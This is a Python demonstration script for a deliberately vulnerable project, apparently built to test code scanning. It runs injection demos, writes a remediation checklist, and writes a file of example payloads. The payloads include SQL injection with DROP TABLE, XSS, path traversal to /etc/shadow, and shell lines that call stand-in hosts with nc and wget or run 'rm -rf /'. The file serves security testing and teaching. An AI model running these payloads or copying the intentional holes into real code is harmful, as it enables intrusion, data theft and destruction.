#!/usr/bin/env python3
"""
Main demonstration script for security vulnerabilities
WARNING: This code contains intentional security vulnerabilities!
DO NOT USE IN PRODUCTION!
"""

import sys
import os

# Add current directory to path for imports
sys.path.append(os.path.dirname(os.path.abspath(__file__)))

from utils import VulnerableAuth, VulnerableCrypto, vulnerable_eval
from database import VulnerableDatabase
from networking import VulnerableNetworking, VulnerableAPI
from config import VulnerableConfig, VulnerableLogging

def demonstrate_vulnerabilities():
    """Demonstrate various security vulnerabilities"""
    
    print("=" * 60)
    print("SECURITY VULNERABILITY DEMONSTRATION")
    print("WARNING: This is for educational purposes only!")
    print("=" * 60)
    
    # 1. Authentication Vulnerabilities
    print("\n1. AUTHENTICATION VULNERABILITIES")
    print("-" * 40)
    auth = VulnerableAuth()
    print(f"Weak password check: {auth.authenticate('admin', 'admin123')}")
    print(f"Predictable token: {VulnerableCrypto.generate_session_token()}")
    
    # 2. SQL Injection
    print("\n2. SQL INJECTION VULNERABILITIES")
    print("-" * 40)
    db = VulnerableDatabase()
    # Demonstrate SQL injection
    malicious_input = "admin' OR '1'='1"
    result = db.vulnerable_login(malicious_input, "anything")
    print(f"SQL Injection bypass: {result is not None}")
    
    # 3. Code Injection
    print("\n3. CODE INJECTION VULNERABILITIES")
    print("-" * 40)
    print(f"Eval injection: {vulnerable_eval('2+2')}")
    dangerous_code = '__import__("os").getcwd()'
    print(f"Dangerous eval: {vulnerable_eval(dangerous_code)}")
    
    # 4. Configuration Vulnerabilities
    print("\n4. CONFIGURATION VULNERABILITIES")
    print("-" * 40)
    config = VulnerableConfig()
    db_config = config.get_database_config()
    print(f"Exposed DB password: {db_config.get('password', 'Not found')}")
    
    # 5. Networking Vulnerabilities
    print("\n5. NETWORKING VULNERABILITIES")
    print("-" * 40)
    net = VulnerableNetworking()
    print("SSRF vulnerability present - can request internal URLs")
    
    # 6. Logging Vulnerabilities
    print("\n6. LOGGING VULNERABILITIES")
    print("-" * 40)
    logger = VulnerableLogging()
    logger.log_user_action("testuser", "login", {"password": "secret123"})
    print("Sensitive data logged to app.log")
    
    print("\n" + "=" * 60)
    print("VULNERABILITY SUMMARY:")
    print("- SQL Injection (multiple locations)")
    print("- Cross-Site Scripting (XSS)")
    print("- Command Injection")
    print("- Path Traversal")
    print("- Insecure Deserialization")
    print("- Hardcoded Credentials")
    print("- Weak Cryptography")
    print("- Information Disclosure")
    print("- Server-Side Request Forgery (SSRF)")
    print("- Insecure Direct Object References")
    print("- And many more...")
    print("=" * 60)

def create_exploit_examples():
    """Create example exploit payloads"""
    
    exploits = {
        "sql_injection": [
            "admin' OR '1'='1",
            "' UNION SELECT password FROM users --",
            "'; DROP TABLE users; --",
            "' OR 1=1 LIMIT 1 OFFSET 1 --"
        ],
        "xss_payloads": [
            "<script>alert('XSS')</script>",
            "<img src=x onerror=alert('XSS')>",
            "javascript:alert('XSS')",
            "<svg onload=alert('XSS')>"
        ],
        "command_injection": [
            "; cat /etc/passwd",
            "| nc attacker.com 4444",
            "&& wget http://evil.com/malware.sh",
            "; rm -rf /"
        ],
        "path_traversal": [
            "../../../etc/passwd",
            "..\\..\\..\\windows\\system32\\drivers\\etc\\hosts",
            "/etc/shadow",
            "file:///etc/passwd"
        ],
        "code_injection": [
            "__import__('os').system('whoami')",
            "exec('import os; os.system(\"ls -la\")')",
            "eval('2+2')",
            "compile('print(\"hello\")', '<string>', 'exec')"
        ]
    }
    
    exploit_file = "/Users/eltyagi/Desktop/projects/poc-codeql-artifact-attestation/exploit_examples.json"
    import json
    with open(exploit_file, 'w') as f:
        json.dump(exploits, f, indent=2)
    
    print(f"Exploit examples written to: {exploit_file}")

def create_security_checklist():
    """Create a security checklist for remediation"""
    
    checklist = """
SECURITY REMEDIATION CHECKLIST
==============================

CRITICAL VULNERABILITIES TO FIX:

□ SQL Injection
  - Use parameterized queries/prepared statements
  - Validate and sanitize all user inputs
  - Use ORM frameworks properly

□ Cross-Site Scripting (XSS)
  - Escape all user outputs
  - Use Content Security Policy (CSP)
  - Validate input on both client and server side

□ Command Injection
  - Never use shell=True with user input
  - Use subprocess with argument lists
  - Validate and whitelist allowed commands

□ Path Traversal
  - Validate file paths
  - Use os.path.join() and os.path.abspath()
  - Implement proper access controls

□ Insecure Deserialization
  - Avoid pickle with untrusted data
  - Use safe serialization formats (JSON)
  - Implement signature verification

□ Hardcoded Credentials
  - Use environment variables
  - Implement proper secrets management
  - Never commit secrets to version control

□ Weak Cryptography
  - Use strong hashing algorithms (bcrypt, scrypt)
  - Generate cryptographically secure random numbers
  - Implement proper key management

□ Information Disclosure
  - Remove debug information in production
  - Implement proper error handling
  - Audit log contents for sensitive data

□ Server-Side Request Forgery (SSRF)
  - Validate and whitelist URLs
  - Use internal DNS resolution
  - Implement network segmentation

□ Insecure Configuration
  - Change default passwords
  - Disable debug mode in production
  - Implement proper access controls

ADDITIONAL SECURITY MEASURES:

□ Input Validation
  - Validate all user inputs
  - Use whitelisting over blacklisting
  - Implement proper data types

□ Authentication & Authorization
  - Implement multi-factor authentication
  - Use secure session management
  - Follow principle of least privilege

□ Security Headers
  - Implement CSP, HSTS, X-Frame-Options
  - Use secure cookie flags
  - Add security-related HTTP headers

□ Dependency Management
  - Keep dependencies updated
  - Use dependency scanning tools
  - Audit third-party libraries

□ Logging & Monitoring
  - Log security events
  - Monitor for suspicious activities
  - Implement alerting mechanisms

□ Secure Development Practices
  - Code reviews with security focus
  - Static and dynamic security testing
  - Security training for developers
"""
    
    checklist_file = "/Users/eltyagi/Desktop/projects/poc-codeql-artifact-attestation/SECURITY_CHECKLIST.md"
    with open(checklist_file, 'w') as f:
        f.write(checklist)
    
    print(f"Security checklist written to: {checklist_file}")

if __name__ == "__main__":
    print("Starting vulnerability demonstration...")
    
    try:
        demonstrate_vulnerabilities()
        create_exploit_examples()
        create_security_checklist()
        
        print("\n✅ Vulnerable Python project setup complete!")
        print("\n📁 Files created:")
        print("- app.py (Flask web app with vulnerabilities)")
        print("- utils.py (Utility functions with security issues)")
        print("- database.py (SQL injection vulnerabilities)")
        print("- networking.py (SSRF and network vulnerabilities)")
        print("- config.py (Configuration vulnerabilities)")
        print("- main.py (This demonstration script)")
        print("- requirements.txt (Vulnerable dependencies)")
        print("- exploit_examples.json (Example attack payloads)")
        print("- SECURITY_CHECKLIST.md (Remediation guide)")
        
        print("\n⚠️  WARNING: This project contains intentional security vulnerabilities!")
        print("   Use only for educational and testing purposes.")
        print("   Never deploy this code to production!")
        
    except Exception as e:
        print(f"Error during demonstration: {e}")
        import traceback
        traceback.print_exc()